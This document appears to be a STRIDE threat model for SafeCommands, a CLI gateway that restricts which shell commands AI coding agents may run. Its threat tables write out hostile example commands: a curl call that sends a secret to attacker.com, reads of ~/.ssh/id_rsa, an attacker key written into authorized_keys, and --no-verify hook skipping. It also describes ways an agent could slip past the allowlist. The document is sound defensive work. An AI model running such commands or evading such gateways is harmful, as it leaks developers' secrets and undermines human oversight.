# SafeCommands - STRIDE Threat Model

## System Overview

### Application Description

SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway for AI coding agents. It provides 161 pre-validated commands across 12 groups, allowing AI agents to execute CLI operations without per-command user approval. The tool runs as a NuGet global tool on the developer's workstation.

### User Types

| User Type | Trust Level | Description |
|-----------|-------------|-------------|
| Developer | High | Installs and configures SafeCommands, sets up AI agent allowlists |
| AI Agent | Medium | Invokes `safe` commands autonomously via shell, constrained by built-in allowlist |
| CI/CD Pipeline | Low | GitHub Actions publishes NuGet packages via OIDC trusted publishing |

### Components

```
┌──────────────────────────────────────────────────────┐
│                   AI Agent (Claude Code, etc.)        │
│                  [Medium Trust - Allowlisted]         │
└──────────────────────┬───────────────────────────────┘
                       │ safe <group> <command> [args]
                       ▼
┌──────────────────────────────────────────────────────┐
│                    SafeCommands CLI                   │
│  ┌────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │ Cli (Router)│→│ CommandReg.  │→│ CommandDisp.  │ │
│  │ (Program.cs │  │  (Allowlist) │  │ (Policy seam) │ │
│  │  wires Ports)│ └──────────────┘  └──────┬───────┘ │
│  └────────────┘                            │         │
│                    Command Handlers (via Ports)      │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────┐ │
│  │ IExecutor →   │  │ IProcessHost │  │ IWorkspace │ │
│  │ ProcessRunner │  │ (list/kill)  │  │ (File I/O) │ │
│  └──────┬───────┘  └──────────────┘  └────────────┘ │
└─────────┼────────────────────────────────────────────┘
          │ ArgumentList (no shell interpretation)
          ▼
┌──────────────────────────────────────────────────────┐
│              External CLI Tools                       │
│  git, docker, npm, dotnet, terraform, gh, az, etc.   │
│                  [Delegated Execution]                │
└──────────────────────────────────────────────────────┘
```

All commands flow through a single dispatch seam: `Program.cs` (composition root, wires the real `Ports` adapters) → `Cli.Route` (routing, `--json` handling) → `CommandDispatcher.Execute`, which evaluates the command's declared `Policy` before the handler runs. Handlers reach the outside world only through the `Ports` interfaces (`IExecutor` → `ProcessRunner`, `IProcessHost`, `IWorkspace`, `IRepoProbe`, `IRenderer`).

### Trust Boundaries

1. **AI Agent → SafeCommands CLI**: Agent passes arbitrary strings as arguments. SafeCommands validates against built-in allowlist before execution.
2. **SafeCommands → External Tools**: Commands forwarded via the `IExecutor` port (`ProcessExecutor` → `ProcessRunner`) with `ArgumentList` (no shell interpretation). Flag filtering applied per command.
3. **SafeCommands → File System**: File I/O via the `IWorkspace` port for file commands. Path containment enforced by declared policy rules.
4. **GitHub Actions → NuGet.org**: OIDC trusted publishing, no stored API keys.

### Data Classification

| Data Type | Classification | Handling |
|-----------|---------------|----------|
| Command arguments | Untrusted input | Validated against allowlist |
| Process output (stdout/stderr) | Pass-through | No filtering, returned to caller |
| Environment variables | Potentially sensitive | Secret patterns masked in `env vars` |
| File contents | Varies | Read/write operations with safety checks |
| Git repository data | Developer work product | Protected by clean-tree checks, tracked-file checks |

## STRIDE Analysis

> **Control citations:** SafeCommands is a local developer CLI, not a networked application, so the Control column cites OWASP ASVS 5.0 chapters as a control taxonomy by analogy (target level: L1 baseline). Repudiation and Denial of Service are only thinly covered by ASVS; those threats are cross-linked to the OS/infrastructure layer (or app-level resource caps) that handles them instead of being left without a control.

### S - Spoofing

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| S1 | Compromised NuGet package | Attacker publishes malicious `HC.SafeCommands` version via compromised NuGet account | 1 | 4 | 4 | CI/CD supply chain (OIDC trusted publishing) | OIDC trusted publishing via GitHub Actions, no stored API keys. Package signed via NuGet. |
| S2 | Binary tampering on disk | Attacker modifies the installed `safe` binary on the developer's machine | 1 | 4 | 4 | OS file permissions (infra) | Relies on OS file permissions. NuGet global tool installation has checksum verification. |
| S3 | AI agent identity spoofing | Malicious process calls `safe` pretending to be a legitimate AI agent | 2 | 2 | 4 | ASVS V6 Authentication — waived by design | SafeCommands treats all callers equally - the allowlist is the security boundary, not caller identity. Accepted by design. |

**Countermeasures:**
- OIDC trusted publishing eliminates credential theft vector for NuGet
- Tag-triggered CI only (no branch push publishing)
- Minimal GH Actions permissions (`id-token: write`, `contents: read`)

### T - Tampering

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| T1 | Argument injection via shell metacharacters | Agent passes args containing `;`, `&&`, `|`, `` ` `` to execute arbitrary commands | 1 | 4 | 4 | ASVS V1 Encoding/Sanitization | **Fully mitigated.** `ProcessRunner` uses `ProcessStartInfo.ArgumentList` (not shell execution). Each argument is passed as a discrete parameter - no shell interpretation occurs. |
| T2 | Flag smuggling past allowlist | Agent passes `--force` as part of a combined flag like `--force-with-lease` or via `--force=true` | 2 | 3 | 6 | ASVS V2 Validation | Flag checks use `HashSet.Contains()` on individual args. `--force-with-lease` is intentionally allowed on push. Combined flag forms like `--force=true` are not matched (would need `=` splitting). |
| T3 | Git hook bypass | Agent passes `--no-verify` or `-n` to skip pre-commit hooks | 1 | 3 | 3 | ASVS V2 Validation | **Fully mitigated.** `git commit` carries a declared `BlockFlags(["--no-verify", "-n"])` policy evaluated at the `CommandDispatcher` seam; `--no-verify` is also in `PushBlockedFlags` for push. |
| T4 | Config file tampering | Attacker modifies `~/.safecommands/config.json` to add malicious commands | 2 | 3 | 6 | ASVS V13 Configuration | Extension config not yet implemented (the `Configuration/` directory is empty). When added, should use SHA-256 trust verification (like P:\Dev pattern). |
| T5 | Destructive HTTP method via `gh api` proxy | Agent runs `safe proxy gh api -X DELETE repos/o/r` (or `PUT`/`PATCH`), or smuggles a method-override header like `-H "X-HTTP-Method-Override: DELETE"`, to delete or overwrite GitHub resources through the gateway | 1 | 4 | 4 | ASVS V2 Validation / V4 API | **Fully mitigated.** `gh api`'s flag allowlist permits field (`-f`/`-F`), output (`-q`/`--jq`), and pagination flags but omits `-X`/`--method` **and** `-H`/`--header`. `gh api` auto-selects GET (no fields) or POST (with fields), so with the method override blocked, writes are confined to POST-via-fields (resource creation). Excluding `-H` keeps that boundary structural rather than dependent on the remote server declining a method-override header; DELETE/PUT/PATCH cannot be expressed. |

**Countermeasures:**
- `UseShellExecute = false` + `ArgumentList` eliminates command injection
- Per-command flag blocklists for dangerous flags
- Immutable built-in allowlist compiled into binary

### R - Repudiation

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| R1 | No audit trail of commands executed | Agent runs destructive commands (even allowed ones) with no record of what was executed, when, or by whom | 3 | 3 | **9** | ASVS V16 Security Logging (absent) | **Unmitigated.** No logging infrastructure exists. See [#1](https://github.com/hansen-consultancy/SafeCommands/issues/1). |
| R2 | JSON output lacks provenance | `--json` output doesn't include timestamp, tool version, or execution context | 2 | 2 | 4 | ASVS V16 Security Logging | Low priority. Callers can add their own metadata. |

**Countermeasures:**
- **R1 is a high-priority gap.** Recommend adding optional audit logging in a future release.
- Git operations leave their own audit trail via git reflog

### I - Information Disclosure

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| I1 | Environment variable secret exposure | Agent calls `safe env vars` and variable names don't match blocklist patterns (e.g., `MY_SIGNING_KEY`, `STRIPE_SK`) | 2 | 3 | 6 | ASVS V14 Data Protection | **Mitigated.** Default mode shows only allowlisted safe vars (~70 prefixes). `--all` flag shows all vars with expanded secret masking (34 patterns). |
| I2 | File read outside project directory | Agent calls `safe file read /etc/passwd` or `safe file read ~/.ssh/id_rsa` to read sensitive files | 1 | 3 | 3 | ASVS V5 File Handling | **Fully mitigated.** Covered by the same `RequirePathWithinProjectRule` as E1: a declared `Policy` on each `file` read command, evaluated at the `CommandDispatcher` seam before the handler runs. Path resolution and the project-root boundary live in the `IWorkspace` port. |
| I3 | Process output contains secrets | `safe git log`, `safe docker logs`, or proxy commands return output containing accidentally committed secrets | 2 | 2 | 4 | ASVS V14 Data Protection — accepted | **Accepted risk.** Output pass-through is by design. Users should use git-secrets or similar pre-commit tools. |
| I4 | Data exfiltration via curl URL | Agent calls `safe proxy curl https://attacker.com?secret=value` to send data via GET URL parameters | 2 | 3 | 6 | Network egress control (infra) — none | **Partially mitigated.** POST/PUT/DELETE blocked (`CurlWriteFlags` blocked up front: `-X`, `-d`, `-F`, `--upload-file`, `-T`), but GET with query params can exfiltrate data. URL validation not implemented. |
| I5 | Generated secrets exposed in agent context | Agent calls `safe generate secret` or `safe generate password` and the value appears in chat/logs. Secrets never reach a secure store — they exist only in stdout. | 3 | 2 | 6 | ASVS V14 Data Protection — accepted | **Accepted by design.** The agent explicitly requested the value for use in config scaffolding, test fixtures, etc. Users should rotate any generated secret used in production. |
| I6 | JWT payload disclosure via jwt-decode | Agent decodes a JWT containing PII or sensitive claims, exposing the payload in chat context | 2 | 2 | 4 | ASVS V14 Data Protection — accepted | **Accepted by design.** Agent explicitly requested decode. No signature verification is performed — this is inspection, not authentication. |

**Countermeasures:**
- I1: Expand secret patterns or switch to allowlist approach for env vars
- I2: Resolved — read sandboxing is now the declared `RequirePathWithinProjectRule` shared with E1
- I4: Consider URL allowlisting or domain restrictions for curl proxy
- I5: Document that generated secrets are visible in agent conversation and should be rotated if used in production

### D - Denial of Service

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| D1 | Resource exhaustion via large file operations | Agent calls `safe file delete-pattern *.* --in node_modules` on a monorepo with millions of files | 2 | 2 | 4 | App-level resource caps (ASVS thin on DoS) | Partially mitigated: `file find` caps at 500 results, `file tree` defaults to depth 3. Delete operations have no file count limit. |
| D2 | Process timeout | Spawned process hangs indefinitely (e.g., `safe dotnet run` starts a web server) | 2 | 1 | 2 | OS process control (infra) | **Accepted risk.** Long-running processes are expected for `run`, `watch`, `serve`. Agent or user can Ctrl+C. |
| D3 | Docker log output size | `safe docker logs <container>` captures all logs into memory | 2 | 2 | 4 | App-level resource caps | `-f`/`--follow` stripped to prevent infinite streaming. Large historical logs could exhaust memory. |

**Countermeasures:**
- Future: add configurable timeouts to ProcessRunner
- Future: add file count limits to bulk delete operations

### E - Elevation of Privilege

| ID | Threat | Attack Path | Likelihood | Impact | Score | Control | Mitigation |
|----|--------|-------------|------------|--------|-------|---------|------------|
| E1 | File write outside project directory | Agent calls `safe file write ~/.ssh/authorized_keys --content "attacker_key"` or `safe file write ~/.bashrc --content "malicious"` | 1 | 4 | 4 | ASVS V5 File Handling / V8 Authorization | **Fully mitigated.** Path containment for all `file` ops (and `generate hash-file`) is a declared `Policy` — `RequirePathWithinProjectRule` (plus `RequireWithinSafeDeleteDirRule` for `delete-pattern`) — evaluated once at the `CommandDispatcher` seam before the handler, not scattered inline. A blocked path renders the uniform Blocked envelope (now including the `--json` branch). Resolution and the project-root boundary are owned by the `IWorkspace` port and unit-tested at the boundary. |
| E2 | Process kill beyond dev tools | Agent calls `safe process kill-name` with a name that matches a critical system process | 1 | 3 | 3 | ASVS V8 Authorization | **Fully mitigated.** Kill-name carries a declared `AllowOnlyFirstArg(AllowedKillNames)` policy: `node`, `dotnet`, `python`, `java`, `webpack`, `vite`, `tsc`, `cargo`, etc. Only dev tooling processes can be killed by name. |
| E3 | Proxy command allowlist bypass via prefix matching | Agent crafts subcommand that starts with allowed prefix but includes additional dangerous operations | 1 | 3 | 3 | ASVS V8 Authorization / V2 Validation | **Fully mitigated.** Proxy validation is a declared `Policy` (`AllowSubcommandsRule`) evaluated centrally at the `CommandDispatcher` seam: token-boundary subcommand matching (string-prefix matching is gone — `status` no longer accepts `status-quo`, `pr list` no longer accepts `pr listicle`) **and** the formerly-dead per-subcommand flag allowlist is now enforced (e.g. `safe proxy gh api -X POST` and `safe proxy terraform plan -auto-approve` are blocked). The `Program.cs` dispatch bypass that routed proxy around the policy seam was removed, so proxy blocks now also emit the uniform `--json` Blocked envelope. |
| E4 | Privilege inheritance | SafeCommands runs as the invoking user. If run as root/admin, all commands inherit those privileges | 1 | 4 | 4 | Least privilege (OS/infra) | **Accepted by design.** CLI tools inherit caller privileges. Documentation should warn against running as root. |
| E5 | Arbitrary process kill via kill-port | Agent calls `safe process kill-port <port>` for a port held by a non-dev process (local database, VPN client, corporate agent); the port-holder is killed without the dev-tool name allowlist applied | 2 | 2 | 4 | ASVS V8 Authorization | **Accepted with caveat.** `kill-port` exists to free a port regardless of holder, so the `AllowedKillNames` allowlist is deliberately not applied (unlike `kill-name`). Constrained to processes actually LISTENING on the given TCP port, and runs with invoking-user privileges only. Recommendation: warn or require an explicit flag when the port-holder's name is outside `AllowedKillNames`. |

**Countermeasures:**
- E1: Resolved — sandboxing is the declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule`, centrally evaluated at the dispatch seam
- E3: Resolved — proxy validation is the declared `AllowSubcommandsRule` (token-boundary subcommand match + per-subcommand flag enforcement), centrally evaluated at the dispatch seam
- E5: Consider a name-allowlist warning (or `--force`-style confirmation flag) when kill-port's target process is not a known dev tool

## Risk Summary

### High Priority Threats (Score >= 8)

| ID | Threat | Score | Status |
|----|--------|-------|--------|
| R1 | No audit trail of commands executed | 9 | Unmitigated - recommend audit logging |
| I1 | Environment variable secret exposure via incomplete blocklist | 9 | **Mitigated** - switched to allowlist (safe vars only by default, expanded masking with `--all`) |
| E1 | File write outside project directory | 8 | **Mitigated** - declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule` evaluated centrally at the `CommandDispatcher` seam |

### Residual Risks (Accepted by Design)

| ID | Risk | Rationale |
|----|------|-----------|
| S3 | Any process can call `safe` | The allowlist IS the security boundary, not caller authentication |
| D2 | Long-running processes | Expected for dev workflows (`run`, `watch`, `serve`) |
| E4 | Privilege inheritance | Standard CLI behavior, document the risk |
| E5 | kill-port kills any port-holder | The command's purpose is freeing a port regardless of holder; limited to listening processes, invoking-user privileges |
| I3 | Process output may contain secrets | Pass-through is by design, use pre-commit secret scanning |
| I5 | Generated secrets visible in agent context | By design — agents need the value. Rotate secrets used in production. |

## Security Controls Summary

| Control Category | Implementation |
|-----------------|----------------|
| **Command Injection Prevention** | `ProcessStartInfo.ArgumentList` - no shell interpretation |
| **Allowlist Architecture** | Immutable built-in `CommandRegistry`, compiled into binary |
| **Central Policy Enforcement** | Every command's declared `Policy` (rule chain) evaluated at the single `CommandDispatcher` seam before its handler runs; handlers reach the OS only via `Ports` |
| **Git Safety** | Clean-tree checks, force-push blocked, hook bypass blocked, amend-after-push blocked |
| **Database Protection** | All `--force`/`--force-reset`/`--accept-data-loss` flags blocked on migrations |
| **File Safety** | Tracked-file checks, temp-directory allowlist, no-overwrite on write/copy |
| **Process Safety** | Kill-by-name restricted to dev-tooling allowlist; kill-port limited to listening port holders |
| **Docker Safety** | Volume deletion blocked, compose-down `-v` blocked |
| **Package Manager Safety** | Supply chain warnings on install, script allowlist, `audit fix --force` blocked |
| **Generate Safety** | All generate commands are read-only pure computation. `hash-file` sandboxed to project directory. No external process execution. |
| **Proxy Validation** | Per-tool subcommand allowlist (token-boundary match) + per-subcommand flag allowlist, enforced as a declared `Policy` at the dispatch seam; curl restricted to GET/HEAD; `gh api` confined to read + POST-via-fields create (`-X`/`--method` and `-H`/`--header` excluded, so no DELETE/PUT/PATCH and no method-override-header bypass) |
| **Secret Masking** | Environment variable secret pattern matching (blocklist) |
| **CI/CD Security** | OIDC trusted publishing, no stored API keys, tag-triggered only |
| **Output Modes** | `--json` for machine-readable output, human-readable with safety colors |

## Review History

| Version | Date | Reviewer | Changes |
|---------|------|----------|---------|
| v1 | 2026-04-04 | STRIDE analysis (initial) | Initial threat model covering 146 commands across 11 groups |
| v2 | 2026-04-04 | STRIDE update (generate group) | Added I5, I6 for generate commands. Updated to 160 commands across 12 groups. |
| v3 | 2026-05-30 | STRIDE update (file/generate path policy) | E1 + I2 path containment migrated from inline `ValidatePath` to declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule` evaluated at the `CommandDispatcher` seam; path blocks now emit the `--json` Blocked envelope. |
| v4 | 2026-06-10 | STRIDE update (proxy policy) | E3 resolved: proxy validation migrated from string-prefix matching (which never read the per-subcommand flag allowlist) to the declared `AllowSubcommandsRule` — token-boundary subcommand match **and** per-subcommand flag enforcement — evaluated at the `CommandDispatcher` seam. The `Program.cs` proxy dispatch bypass was removed; proxy blocks now emit the `--json` Blocked envelope. |
| v5 | 2026-06-13 | STRIDE update (gh api flags) | Added T5. `gh api`'s previously empty flag allowlist (which blocked every flag, leaving only bare GET usable) now permits field/output/pagination flags for read and POST-via-fields create. `-X`/`--method` and `-H`/`--header` remain excluded, so DELETE/PUT/PATCH cannot be expressed through the gateway — neither directly nor via a method-override header. |
| v6 | 2026-06-20 | STRIDE update (arg-parsing unification) | Candidate 4 consolidated per-handler arg parsing into the shared case-insensitive `Sugar/Args` helper. This created a handler↔policy case-agreement requirement for the path flags behind E1/I2: a handler must read the *same* token the policy checks. `Safety/PathArg.FlagValue` was therefore flipped from ordinal to case-insensitive matching in lockstep, so a flag like `--IN` that a handler honors cannot slip a path past `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule`. Net-safer (matches a superset of before; containment still enforced); regression-tested via `file delete-pattern --IN`. No new threats — strengthens the existing E1/I2 mitigation. |
| v7 | 2026-07-04 | STRIDE update (Candidate 3 verification + control backfill) | Re-verified all mitigations after the Candidate 3 Ports refactor (all groups migrated onto `Ports`, `Program.cs` extracted into testable `Cli`, `OutputFormatter` deleted, new `IProcessHost` port): T1/T3/T5/E1/E2/E3/I1/I2/I4 all hold; dispatch remains a single policy seam with no bypass. Updated System Overview to the Cli + Ports/Adapters architecture; count corrected to 161 commands. T3 mitigation text updated (now a declared `BlockFlags` policy, no longer handler-inline). Added E5: `kill-port` kills the listening port-holder without the dev-tool name allowlist (accepted with recommendation). Backfilled the Control (ASVS/infra) column for all threats per the control-citation guidance. |

## References

- [STRIDE Threat Model (Microsoft)](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [OWASP ASVS 5.0](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [NuGet Trusted Publishing](https://devblogs.microsoft.com/nuget/introducing-nuget-login/)
- [Real-world AI agent incidents research](specs/PRD.md#real-world-incident-research) - 70+ documented incidents informing this tool's design
